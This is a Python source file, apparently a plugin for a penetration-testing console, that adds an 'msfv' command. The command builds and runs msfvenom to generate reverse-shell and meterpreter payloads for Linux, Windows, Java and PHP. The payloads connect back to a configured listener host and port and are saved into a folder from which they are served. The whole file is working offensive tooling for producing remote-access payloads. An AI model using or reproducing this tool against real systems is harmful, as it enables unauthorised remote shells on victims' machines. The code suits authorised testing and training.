import logging as logger
import os
import subprocess
from pathlib import Path
from uuid import uuid4

from colorama import Fore


def add_cmd(pm, cmd):
    msfv_tlinux_dict = ["elf", "asp", "war"]
    msfv_twindows_dict = ["exe", "msi", "dll", "vba", "asp", "aspx", "war"]
    # msfv_encoders = ["x86/shikata_ga_nai"]
    msfv_payload_dict = {
        "linux/x86/shell/reverse_tcp": msfv_tlinux_dict,
        "linux/x64/shell/reverse_tcp": msfv_tlinux_dict,
        "linux/x86/shell_reverse_tcp": msfv_tlinux_dict,
        "linux/x64/shell_reverse_tcp": msfv_tlinux_dict,
        "linux/x86/meterpreter/reverse_tcp": msfv_tlinux_dict,
        "linux/x64/meterpreter/reverse_tcp": msfv_tlinux_dict,
        "linux/x86/meterpreter_reverse_tcp": msfv_tlinux_dict,
        "linux/x64/meterpreter_reverse_tcp": msfv_tlinux_dict,
        "windows/shell/reverse_tcp": msfv_twindows_dict,
        "windows/shell_reverse_tcp": msfv_twindows_dict,
        "windows/x64/shell_reverse_tcp": msfv_twindows_dict,
        "windows/meterpreter/reverse_tcp": msfv_twindows_dict,
        "windows/x64/meterpreter/reverse_tcp": msfv_twindows_dict,
        "windows/meterpreter_reverse_tcp": msfv_twindows_dict,
        "windows/x64/meterpreter_reverse_tcp": msfv_twindows_dict,
        "java/jsp_shell_reverse_tcp": "raw",
        "php/reverse_php": "raw",
    }

    def cmd_msfv(args):
        if cmd_validate(args, 1, 'Missing arguments: "payload", "type"'):
            if cmd_validate(args, 2, 'Missing arguments: "type"'):
                msfv_payload, sub_args = split(args)
                msfv_type, sub_args = split(sub_args)

                msfv_tmpfolder = Path(pm.cfg.serve_folder, "tmp")
                msfv_tmpfile = generate_random_filename(msfv_tmpfolder, msfv_type) if len(sub_args) == 0 else sub_args[0]

                if not msfv_tmpfolder.exists():
                    os.makedirs(msfv_tmpfolder)

                msfv_cmd = f"msfvenom -p {msfv_payload} LHOST={pm.cvars.LHOST} LPORT={pm.cvars.LPORT} -f {msfv_type} -o {msfv_tmpfile}"
                subprocess.call(msfv_cmd.split(" "), stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
                logger.info(f'Generated: "{Fore.LIGHTYELLOW_EX}{msfv_tmpfile}{Fore.RESET}"\n{Fore.LIGHTBLACK_EX}{msfv_cmd}{Fore.RESET}')

    cmd.add(["msfv"], cmd_msfv, msfv_payload_dict)


def split(arr):
    if len(arr) > 0:
        return arr[0], arr[1:] or []
    return "", []


def cmd_validate(cmd_arr, expected_len, fail_msg=None):
    if len(cmd_arr) >= expected_len:
        return True
    elif fail_msg:
        logger.warning(fail_msg)
    return False


def generate_random_filename(folder: Path, extension: str, lenght: int = 8):
    filename = abs(hash(uuid4().hex)) % (10**lenght)
    fileextension = "" if extension in ["elf"] else f".{extension}"
    return Path(folder, f"{filename}{fileextension}")
